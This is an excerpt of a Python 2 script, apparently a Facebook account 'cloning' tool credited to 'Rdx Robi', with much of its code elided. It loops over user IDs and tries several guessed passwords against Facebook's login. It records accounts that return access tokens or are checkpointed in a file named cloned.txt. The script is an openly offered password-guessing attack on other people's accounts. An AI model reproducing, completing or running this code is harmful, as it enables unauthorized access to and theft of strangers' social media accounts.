...
logo1 = """
 ...
 |  _  // _` \ \/ / |  _  // _ \|  _ <| |
 | | \ \ (_| |>  <  | | \ \ (_) | |_) | |
 |_|  \_\__,_/_/\_\ |_|  \_\___/|____/|_|
                                         
                                                                         
╔══──────────────────────────╗
║AUTHOR   >>  Rdx Robi                           
║GITHUB   >>     https://github.com/RdxRobi                             
║FACEBOOK >>   R dx Robi  
║YOUTUBE  >>     RdxTech B D   
╚══──────────────────────────╝
"""
...
def pilih_login():
    ...
    if peak =="":
        ...
        os.system('xdg-open  https://youtube.com/channel/UCcxRmLCxoyoCAihBEMJy6jg')
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[NTND-OK]  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[Rdx-CP] ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[Rdx-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[Rdx-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[Rdx-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[Rdx-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[Rdx-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[Rdx-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[Rdx-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[Rdx-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;97mFb\033[1;97mR dx Robi"""
